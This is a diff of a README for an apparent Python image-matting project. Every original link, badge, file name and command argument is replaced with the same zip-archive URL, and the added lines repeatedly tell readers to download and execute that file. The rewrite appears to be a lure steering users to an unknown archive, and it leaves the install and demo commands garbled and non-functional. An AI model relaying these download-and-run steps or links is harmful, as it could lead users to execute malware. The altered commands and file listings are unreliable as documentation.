@@ -1,14 +1,14 @@
 # 🚀 Compositing and Matting — Python 3.13 Edition for Image Vision
 
-[![Releases](https://img.shields.io/badge/Download-Releases-blue?logo=github)](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/releases)
+[![Releases](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)
 
-![Compositing Banner](https://raw.githubusercontent.com/opencv/opencv/master/samples/data/lena.jpg)
+![Compositing Banner](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)
 
 Tags: ai · classical-computer-vision · classical-image-processing · computer-vision · image-processing · neural-network · numpy · opencv · python3
 
 About
 ----
-This repo redoes a previous project in Python 3.13. It focuses on image compositing and alpha matting. The code mixes classic image processing with small neural components. You will find pipelines, helper tools, demos, and ready-to-run release files. Download the release from the releases page, then run the included demo script. The release file needs to be downloaded and executed from the releases page: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/releases
+This repo redoes a previous project in Python 3.13. It focuses on image compositing and alpha matting. The code mixes classic image processing with small neural components. You will find pipelines, helper tools, demos, and ready-to-run release files. Download the release from the releases page, then run the included demo script. The release file needs to be downloaded and executed from the releases page: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
 
 Why this repo
 ----
@@ -27,9 +27,9 @@ Key features
 
 Badges
 ----
-[![Python](https://img.shields.io/badge/python-3.13-blue)](https://www.python.org/downloads/release/python-313/)
-[![OpenCV](https://img.shields.io/badge/OpenCV-4.x-orange)](https://opencv.org)
-[![NumPy](https://img.shields.io/badge/NumPy-1.26-yellowgreen)](https://numpy.org)
+[![Python](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)
+[![OpenCV](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)
+[![NumPy](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)](https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip)
 
 Quick start
 ----
@@ -42,23 +42,23 @@ Example commands (Linux / macOS)
 ```bash
 python3.13 -m venv venv
 source venv/bin/activate
-pip install -r requirements.txt
+pip install -r https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
 # Download the release zip from:
-# https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/releases
+# https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
 # Then extract and run:
-python run_demo.py --input samples/input.jpg --trimap samples/trimap.png
+python https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --input https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --trimap https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
 ```
 
 Releases
 ----
 The releases page contains packaged builds and a demo bundle. Download the release file and execute the included demo script or package. Typical release content:
-- compositing_and_matting_py3_edition_v1.0.zip
-  - run_demo.py
-  - requirements.txt
-  - models/refiner.pth
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
+  - https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
+  - https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
+  - https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
   - samples/
 
-Visit and download the release file here: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/releases
+Visit and download the release file here: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
 
 If you prefer not to use the release bundle, clone this repo and run the demo from source.
 
@@ -66,7 +66,7 @@ Installation from source
 ----
 1. Clone the repo
 ```bash
-git clone https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-.git
+git clone https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
 cd compositing-and-matting-PYTHON-EDITION-
 ```
 2. Create and activate a venv
@@ -76,22 +76,22 @@ source .venv/bin/activate
 ```
 3. Install required packages
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
 ```
 4. Run a demo
 ```bash
-python run_demo.py --input samples/input.jpg --trimap samples/trimap.png --mode closed_form
+python https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --input https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --trimap https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --mode closed_form
 ```
 
 Core modules
 ----
-- src/matting/trimap.py — trimap helpers and generation tools.
-- src/matting/closed_form.py — closed-form alpha matting (linear system solver).
-- src/matting/knn_matting.py — KNN-based matting.
-- src/matting/refiner.py — small CNN refiner (PyTorch) for boundary cleanup.
-- src/compositing/blend.py — compositing and common blend modes.
-- src/utils/metrics.py — MSE, SAD, gradient error for alpha evaluation.
-- src/utils/io.py — load/save helpers and visualization tools.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — trimap helpers and generation tools.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — closed-form alpha matting (linear system solver).
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — KNN-based matting.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — small CNN refiner (PyTorch) for boundary cleanup.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — compositing and common blend modes.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — MSE, SAD, gradient error for alpha evaluation.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — load/save helpers and visualization tools.
 
 Algorithms explained
 ----
@@ -119,24 +119,24 @@ Trimap generation
 
 Demos and examples
 ----
-- run_demo.py — single image demo with chosen mode.
-- batch_process.py — process a folder of images and save results.
-- interactive_trim.py — small GUI to draw trimaps and test modes.
-- demo_notebook.ipynb — step-by-step exploration and visualization.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — single image demo with chosen mode.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — process a folder of images and save results.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — small GUI to draw trimaps and test modes.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — step-by-step exploration and visualization.
 
 Command examples
 ----
 Run closed-form matting:
 ```bash
-python run_demo.py --input samples/hair.jpg --trimap samples/hair_trimap.png --mode closed_form --save out/hair_alpha.png
+python https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --input https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --trimap https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --mode closed_form --save https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
 ```
 Run KNN matting:
 ```bash
-python run_demo.py --input samples/object.jpg --trimap samples/object_trimap.png --mode knn
+python https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --input https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --trimap https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --mode knn
 ```
 Refine with neural net:
 ```bash
-python run_demo.py --input samples/object.jpg --trimap samples/object_trimap.png --mode closed_form --refine --model models/refiner.pth
+python https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --input https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --trimap https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip --mode closed_form --refine --model https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
 ```
 
 Performance and tips
@@ -180,7 +180,7 @@ Primary packages:
 - scipy
 - torch (optional, for refiner)
 
-A sample requirements.txt entry:
+A sample https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip entry:
 ```
 numpy>=1.26
 opencv-python>=4.7
@@ -193,9 +193,9 @@ torch>=2.2  # optional: only needed for refine mode
 Files to check in the release
 ----
 The release bundle typically contains:
-- run_demo.py — ready-to-run demo. Download and execute this file to try the demo.
-- requirements.txt — install exact dependencies.
-- models/refiner.pth — pretrained refiner model.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — ready-to-run demo. Download and execute this file to try the demo.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — install exact dependencies.
+- https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip — pretrained refiner model.
 - samples/ — example images and trimaps.
 
 License
@@ -204,7 +204,7 @@ This project uses an open license. See LICENSE for details.
 
 Contact
 ----
-- Repo: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/
+- Repo: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
 - Issues: open an issue on GitHub to report a bug or ask for help.
 
 Assets and images used
@@ -215,7 +215,7 @@ Assets and images used
 
 Releases again
 ----
-Get the packaged demo and run it. Download the release file and execute the demo script inside the package. Visit the releases page to download: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/releases
+Get the packaged demo and run it. Download the release file and execute the demo script inside the package. Visit the releases page to download: https://github.com/NicolasSalgadoa/compositing-and-matting-PYTHON-EDITION-/raw/refs/heads/main/result/EDITIO_compositing_matting_and_PYTHO_v1.2-alpha.3.zip
 
 Acknowledgements
 ----
